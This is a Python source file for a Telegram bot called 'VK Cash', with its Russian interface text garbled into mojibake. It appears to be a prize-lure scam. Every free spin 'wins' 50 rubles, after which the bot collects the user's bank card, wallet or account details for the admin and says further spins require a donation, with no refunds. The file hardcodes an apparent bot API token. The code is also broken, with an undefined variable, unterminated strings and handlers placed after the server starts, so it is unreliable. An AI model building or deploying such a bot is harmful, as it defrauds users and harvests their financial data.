
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from flask import Flask, request
import re
import time
import random
import json
import os

API_TOKEN = '8135081615:AAFHaG7cgRaNlBAAEk_ALEP0-wHYzOniYbU'
ADMIN_ID = 6180147473

bot = telebot.TeleBot(API_TOKEN)
app = Flask(__name__)
user_states = {}
first_spin_done = {}

CODES_FILE = "codes.json"
if not os.path.exists(CODES_FILE):
    with open(CODES_FILE, "w") as f:
        json.dump({}, f)

def generate_code(amount, user_id):
    timestamp = int(time.time() * 1000)
    random_part = ''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=4))
    code = f"CODE-{amount}-{timestamp}-{random_part}"
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    codes[code] = {
        "user_id": user_id,
        "amount": amount,
        "used": False
    }
    with open(CODES_FILE, "w") as f:
        json.dump(codes, f, indent=4)
    return code

@bot.message_handler(commands=['start'])
def send_start(message):
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("üéÅ –ö—Ä—É—Ç–∏—Ç—å –±–µ—Å–ø–ª–∞—Ç–Ω–æ", callback_data="free_spin"),
        InlineKeyboardButton("üìú –ü—Ä–∞–≤–∏–ª–∞", callback_data="rules"),
        InlineKeyboardButton("‚ùì FAQ", callback_data="faq"),
        InlineKeyboardButton("üìã –ü–æ–ª–∏—Ç–∏–∫–∞", callback_data="policy")
    )
    bot.send_message(message.chat.id, "üé∞ –î–æ–±—Ä–æ –ø–æ–∂–∞–ª–æ–≤–∞—Ç—å –≤ VK Cash!\n–í—ã–±–∏—Ä–∞–π –¥–µ–π—Å—Ç–≤–∏–µ –Ω–∏–∂–µ:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "free_spin")
def handle_spin(call):
    uid = call.from_user.id
    if first_spin_done.get(uid):
        bot.answer_callback_query(call.id, "–ë–µ—Å–ø–ª–∞—Ç–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ —É–∂–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∞.")
        return

    first_spin_done[uid] = True
    amount = 50

    msg = bot.send_message(call.message.chat.id, "üîÑ –ö—Ä—É—Ç–∏–º –∫–æ–ª–µ—Å–æ...\n[ üé∞ üé∞ üé∞ ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ üçã üçí üí£ ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ üçâ üí∞ üí£ ]")
    time.sleep(1)
    bot.edit_message_text(chat_id=msg.chat.id, message_id=msg.message_id, text="[ üçÄ üí∞ üçí ]")
    time.sleep(1)

    code = generate_code(amount, uid)
    user_states[uid] = {"amount": amount, "code": code}
    message_text = f"üéâ *–ü–û–ë–ï–î–ê {amount}‚ÇΩ!* üéâ\nüé´ –ö–æ–¥: `{code}`\n\nüí≥ –û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å–≤–æ–∏ —Ä–µ–∫–≤–∏–∑–∏—Ç—ã:\n‚Äî –ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã (–°–±–µ—Ä–±–∞–Ω–∫, –¢–∏–Ω—å–∫–æ—Ñ—Ñ)\n‚Äî –ò–ª–∏ –∫–æ—à–µ–ª—ë–∫ (–ÆMoney, Payeer, PayPal)\n‚Äî –ò–ª–∏ –±–∞–Ω–∫ + –Ω–æ–º–µ—Ä —Å—á—ë—Ç–∞"
    bot.send_message(call.message.chat.id, message_text, parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def handle_message(m):
    uid = m.from_user.id
    if uid in user_states:
        state = user_states.pop(uid)
        code = state['code']
        with open(CODES_FILE, "r") as f:
            codes = json.load(f)
        if code not in codes:
            bot.send_message(m.chat.id, "‚ùå –ö–æ–¥ –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–∞—á–∞–ª–∞.")
            return
        if codes[code]["user_id"] != uid:
            bot.send_message(m.chat.id, "‚ùå –≠—Ç–æ—Ç –∫–æ–¥ –Ω–µ –ø—Ä–∏–Ω–∞–¥–ª–µ–∂–∏—Ç –≤–∞–º.")
            return
        if codes[code]["used"]:
            bot.send_message(m.chat.id, "‚ö†Ô∏è –≠—Ç–æ—Ç –∫–æ–¥ —É–∂–µ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω.")
            return

        payout_info = f"üí∞ –ù–æ–≤–∞—è –∑–∞—è–≤–∫–∞:
üë§ @{m.from_user.username or m.from_user.first_name}
üÜî {uid}
üì¶ –°—É–º–º–∞: {state['amount']}‚ÇΩ
üîê –ö–æ–¥: {code}
üí≥ –†–µ–∫–≤–∏–∑–∏—Ç—ã: {m.text}"
        markup = InlineKeyboardMarkup()
        markup.add(InlineKeyboardButton("üí∏ –í—ã–ø–ª–∞—Ç–∏—Ç—å", callback_data=f"pay_{uid}_{code}"))
        bot.send_message(ADMIN_ID, payout_info, reply_markup=markup)
        bot.reply_to(m, "‚úÖ –ó–∞—è–≤–∫–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! –û–∂–∏–¥–∞–π –≤—ã–ø–ª–∞—Ç—É.")
    elif rnd.randint(1, 50) == 1:
        bot.send_message(m.chat.id, "üëª –ü–∞—Å—Ö–∞–ª–∫–∞! –¢—ã –±—ã–ª –≤—ã–±—Ä–∞–Ω —Å–ª—É—á–∞–π–Ω–æ. –ü–æ–ª—É—á–∞–µ—à—å +5 VKC!")
        add_vkcoins(uid, 5)
    else:
        bot.send_message(m.chat.id, "‚ùå –°–Ω–∞—á–∞–ª–∞ –∫—Ä—É—Ç–∏ –∫–æ–ª–µ—Å–æ –∏ –ø–æ–ª—É—á–∏ –∫–æ–¥!")

@bot.callback_query_handler(func=lambda call: call.data.startswith("pay_"))
def handle_payment(call):
    parts = call.data.split("_")
    user_id = parts[1]
    code = "_".join(parts[2:])
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    if code in codes:
        codes[code]["used"] = True
        with open(CODES_FILE, "w") as f:
            json.dump(codes, f, indent=4)
    bot.send_message(user_id, "üí∏ –í—ã–ø–ª–∞—Ç–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞! –°–ø–∞—Å–∏–±–æ –∑–∞ —É—á–∞—Å—Ç–∏–µ üôå")
    bot.answer_callback_query(call.id, "–í—ã–ø–ª–∞—Ç–∞ –æ—Ç–º–µ—á–µ–Ω–∞!")

@bot.callback_query_handler(func=lambda call: call.data in ["rules", "faq", "policy"])
def handle_info(call):
    info = {
        "rules": "üìú *–ü—Ä–∞–≤–∏–ª–∞ —É—á–∞—Å—Ç–∏—è:*\n- –ü–µ—Ä–≤–∞—è –ø—Ä–æ–∫—Ä—É—Ç–∫–∞ ‚Äî –±–µ—Å–ø–ª–∞—Ç–Ω–∞—è\n- –ü–æ–≤—Ç–æ—Ä–Ω–∞—è ‚Äî –≤—Ä—É—á–Ω—É—é –ø–æ—Å–ª–µ –¥–æ–Ω–∞—Ç–∞\n- –°—É–º–º—ã –±–æ–Ω—É—Å–æ–≤ ‚Äî –æ—Ç 50‚ÇΩ –¥–æ 500‚ÇΩ\n- –ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã ‚Äî —Å–ª—É—á–∞–π–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç",
        "faq": "‚ùì *FAQ:*\n- *–ö–∞–∫ —Å—ã–≥—Ä–∞—Ç—å?* –ù–∞–∂–º–∏ '–ö—Ä—É—Ç–∏—Ç—å'\n- *–ö–∞–∫ —Å–Ω–æ–≤–∞ —Å—ã–≥—Ä–∞—Ç—å?* –ü–æ–∫–∞ –≤—Ä—É—á–Ω—É—é, –∂–¥–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π\n- *–ö–∞–∫ –ø–æ–ª—É—á–∏—Ç—å –±–æ–Ω—É—Å?* –ó–∞–±–µ—Ä–∏ –∫–æ–¥ –∏ –æ—Ç–ø—Ä–∞–≤—å —Ä–µ–∫–≤–∏–∑–∏—Ç—ã",
        "policy": "üìã *–ü–æ–ª–∏—Ç–∏–∫–∞:*\n- –ü—Ä–æ–µ–∫—Ç ‚Äî —Ä–∞–∑–≤–ª–µ–∫–∞—Ç–µ–ª—å–Ω—ã–π\n- –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Å–ª—É—á–∞–π–Ω—ã\n- –í–æ–∑–≤—Ä–∞—Ç–∞ –Ω–µ—Ç\n- –£—á–∞—Å—Ç–∏–µ –¥–æ–±—Ä–æ–≤–æ–ª—å–Ω–æ–µ"
    }
    bot.send_message(call.message.chat.id, info[call.data], parse_mode="Markdown")

@app.route('/', methods=['GET', 'POST'])
def webhook():
    if request.method == 'POST':
        update = telebot.types.Update.de_json(request.stream.read().decode('utf-8'))
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Bot is running!', 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)



@bot.message_handler(commands=['admin'])
def admin_panel(message):
    if message.from_user.id != ADMIN_ID:
        bot.reply_to(message, "‚õî –î–æ—Å—Ç—É–ø –∑–∞–ø—Ä–µ—â—ë–Ω.")
        return
    markup = InlineKeyboardMarkup()
    markup.add(
        InlineKeyboardButton("üì¶ –°–ø–∏—Å–æ–∫ –∫–æ–¥–æ–≤", callback_data="admin_codes"),
        InlineKeyboardButton("üíæ –°–∫–∞—á–∞—Ç—å codes.json", callback_data="admin_download"),
        InlineKeyboardButton("üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞", callback_data="admin_stats")
    )
    bot.send_message(message.chat.id, "üëë –ê–¥–º–∏–Ω-–ø–∞–Ω–µ–ª—å:", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("admin_"))
def handle_admin_actions(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "‚õî –ù–µ—Ç –¥–æ—Å—Ç—É–ø–∞.")
        return

    if call.data == "admin_codes":
        with open(CODES_FILE, "r") as f:
            codes = json.load(f)
        text = "\n".join([f"{code} ‚Äî {data['amount']}‚ÇΩ ‚Äî {'‚úÖ' if data['used'] else 'üïì'}" for code, data in codes.items()])
        bot.send_message(call.message.chat.id, f"üì¶ –ê–∫—Ç–∏–≤–Ω—ã–µ –∫–æ–¥—ã:\n{text[:4000]}")

    elif call.data == "admin_download":
        with open(CODES_FILE, "rb") as f:
            bot.send_document(call.message.chat.id, f)

    elif call.data == "admin_stats":
        with open(CODES_FILE, "r") as f:
            codes = json.load(f)
        total = len(codes)
        used = sum(1 for x in codes.values() if x['used'])
        pending = total - used
        bot.send_message(call.message.chat.id, f"üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞:\n–í—Å–µ–≥–æ –∫–æ–¥–æ–≤: {total}\n–í—ã–ø–ª–∞—á–µ–Ω–æ: {used}\n–û–∂–∏–¥–∞—é—Ç: {pending}")



VKCOIN_FILE = "vkcoins.json"
if not os.path.exists(VKCOIN_FILE):
    with open(VKCOIN_FILE, "w") as f:
        json.dump({}, f)

def add_vkcoins(user_id, amount):
    with open(VKCOIN_FILE, "r") as f:
        coins = json.load(f)
    coins[str(user_id)] = coins.get(str(user_id), 0) + amount
    with open(VKCOIN_FILE, "w") as f:
        json.dump(coins, f, indent=4)

def get_leaderboard(top_n=5):
    with open(CODES_FILE, "r") as f:
        codes = json.load(f)
    stats = {}
    for code, data in codes.items():
        if data["used"]:
            uid = data["user_id"]
            stats[uid] = stats.get(uid, 0) + data["amount"]
    sorted_stats = sorted(stats.items(), key=lambda x: x[1], reverse=True)
    return sorted_stats[:top_n]

@bot.message_handler(commands=['leaderboard'])
def leaderboard(message):
    top = get_leaderboard()
    text = "üèÜ –¢–æ–ø —É—á–∞—Å—Ç–Ω–∏–∫–æ–≤ –ø–æ –≤—ã–∏–≥—Ä—ã—à–∞–º:
"
    for i, (uid, amount) in enumerate(top, 1):
        text += f"{i}. ID {uid} ‚Äî {amount}‚ÇΩ
"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['shop'])
def shop(message):
    with open(VKCOIN_FILE, "r") as f:
        coins = json.load(f)
    user_coins = coins.get(str(message.from_user.id), 0)
    markup = InlineKeyboardMarkup()
    if user_coins >= 10:
        markup.add(InlineKeyboardButton("üé∞ –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ (10 VKC)", callback_data="buy_retry"))
    bot.send_message(message.chat.id, f"üõí –ú–∞–≥–∞–∑–∏–Ω VK Coins:
–£ —Ç–µ–±—è {user_coins} VKC", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "buy_retry")
def buy_retry(call):
    uid = call.from_user.id
    with open(VKCOIN_FILE, "r") as f:
        coins = json.load(f)
    if coins.get(str(uid), 0) >= 10:
        coins[str(uid)] -= 10
        first_spin_done[uid] = False  # —Å–±—Ä–æ—Å –ø–æ–ø—ã—Ç–∫–∏
        with open(VKCOIN_FILE, "w") as f:
            json.dump(coins, f, indent=4)
        bot.send_message(uid, "‚úÖ –ü–æ–≤—Ç–æ—Ä–Ω–∞—è –ø–æ–ø—ã—Ç–∫–∞ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω–∞! –ö—Ä—É—Ç–∏ —Å–Ω–æ–≤–∞.")
    else:
        bot.send_message(uid, "‚ùå –ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ VK Coins.")


